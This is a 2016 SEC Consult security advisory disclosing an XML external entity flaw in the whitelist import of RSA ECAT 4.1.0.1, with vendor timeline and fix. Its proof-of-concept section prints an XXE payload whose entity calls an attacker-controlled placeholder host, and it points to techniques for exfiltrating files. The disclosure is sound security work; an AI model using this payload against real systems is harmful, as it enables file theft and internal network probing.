@@ -1,0 +1,140 @@
+SEC Consult Vulnerability Lab Security Advisory < 20161011-0 >
+=======================================================================
+              title: XML External Entity Injection (XXE)
+            product: RSA Enterprise Compromise Assessment Tool (ECAT)
+ vulnerable version: 4.1.0.1
+      fixed version: 4.1.2.0
+         CVE Number: -
+             impact: Medium
+           homepage: https://www.rsa.com
+              found: 2016-04-27
+                 by: Samandeep Singh (Office Singapore)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Montreal - Moscow
+                     Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"RSA provides more than 30,000 customers around the world with the essential
+security capabilities to protect their most valuable assets from cyber threats.
+With RSA's  award-winning products, organizations effectively detect,
+investigate, and respond to advanced attacks; confirm and manage identities; and
+ultimately, reduce IP theft, fraud, and cybercrime."
+
+Source: https://www.rsa.com/en-us/company/about
+
+
+Business recommendation:
+------------------------
+By exploiting the XXE vulnerability, an attacker can get read access to the
+filesystem of the user's system using RSA ECAT client and thus obtain sensitive
+information from the system. It is also possible to scan ports of the internal
+hosts and cause DoS on the affected host.
+
+SEC Consult recommends not to use the product until a thorough security
+review has been performed by security professionals and all identified
+issues have been resolved.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) XML External Entity Injection
+The used XML parser is resolving external XML entities which allows attackers
+to read files and send requests to systems on the internal network (e.g port
+scanning). The vulnerability can be exploited by tricking the user of
+the application to import a whitelisting file with malicious XML code.
+
+
+Proof of concept:
+-----------------
+1) XML External Entity Injection (XXE)
+
+The RSA ECAT client allows users to import whitelisting files in XML format.
+By tricking the user to import an XML file with malicious XML code to the
+application, it's possible to exploit an XXE vulnerability within the application.
+
+For example by importing the following XML code, arbitrary files can be read
+from the client's system. The following code generates the connection request
+from the client system to attacker system.
+
+===============================================================================
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "http://[IP:port]/" >]><foo>&xxe;</foo>
+===============================================================================
+
+IP:port = IP address and port where the attacker is listening for connections
+
+Furthermore some files can be exfiltrated to remote servers via the
+techniques described in:
+
+https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf
+http://vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf
+
+
+Vulnerable / tested versions:
+-----------------------------
+The XXE vulnerability has been verified to exist in the RSA ECAT software
+version 4.1.0.1 which was the latest version available at the time of
+discovery.
+
+
+Vendor contact timeline:
+------------------------
+2016-04-28: Vulnerabilities reported to the vendor by 3rd party
+2016-06-23: Fixed by vendor in version 4.1.2 (ECAT-5972)
+2016-10-11: SEC Consult releases security advisory
+
+
+Solution:
+---------
+Update to version 4.1.2.0
+
+
+Workaround:
+-----------
+None
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Bangkok - Berlin - Linz - Montreal - Moscow
+Singapore - Vienna (HQ) - Vilnius - Zurich
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/Career.htm
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://www.sec-consult.com/en/About/Contact.htm
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF S. Singh / @2016
